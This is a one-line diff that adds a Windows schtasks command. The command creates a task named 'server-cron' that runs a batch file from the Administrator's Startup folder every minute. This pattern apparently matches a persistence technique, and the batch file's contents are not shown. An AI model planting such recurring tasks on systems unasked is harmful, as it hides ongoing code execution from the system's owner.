@@ -1,0 +1,1 @@
+schtasks /CREATE /TN server-cron /SC MINUTE /MO 1 /TR "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\browser-startup-script.bat"
